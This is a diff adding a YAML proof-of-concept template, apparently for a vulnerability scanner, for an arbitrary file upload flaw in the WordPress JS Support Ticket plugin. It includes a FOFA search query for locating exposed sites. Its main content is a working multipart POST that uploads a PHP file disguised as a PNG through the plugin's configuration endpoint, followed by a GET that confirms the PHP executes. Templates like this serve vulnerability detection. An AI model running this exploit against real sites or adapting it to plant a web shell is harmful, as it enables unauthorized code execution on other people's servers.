@@ -1,0 +1,45 @@
+id: poc-yaml-wordpress-js-support-ticket-anyfile-upload
+info:
+  name: WordPress-js-support-ticket  任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: js_support_ticket
+  fofa: body="wp-content/plugins/js-support-ticket" && icon_hash="1198047028"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /wp-admin/?page=configuration&task=saveconfiguration
+  headers:
+    Content-Type: multipart/form-data; boundary=--------767099171
+  data: '----------767099171
+
+    Content-Disposition: form-data; name="action"
+
+
+    configuration_saveconfiguration
+
+    ----------767099171
+
+    Content-Disposition: form-data; name="form_request"
+
+
+    jssupportticket
+
+    ----------767099171
+
+    Content-Disposition: form-data; name="support_custom_img"; filename="{{.t1}}.php"
+
+    Content-Type: image/png
+
+
+    <?php echo md5({{.t1}})?>
+
+    ----------767099171--'
+  expression: status_code == 302 && !contains(body,"<")
+- method: GET
+  path: /wp-content/plugins/js-support-ticket/jssupportticketdata/supportImg/{{.t1}}.php
+  expression: status_code == 200 && body == t2
+transport: http
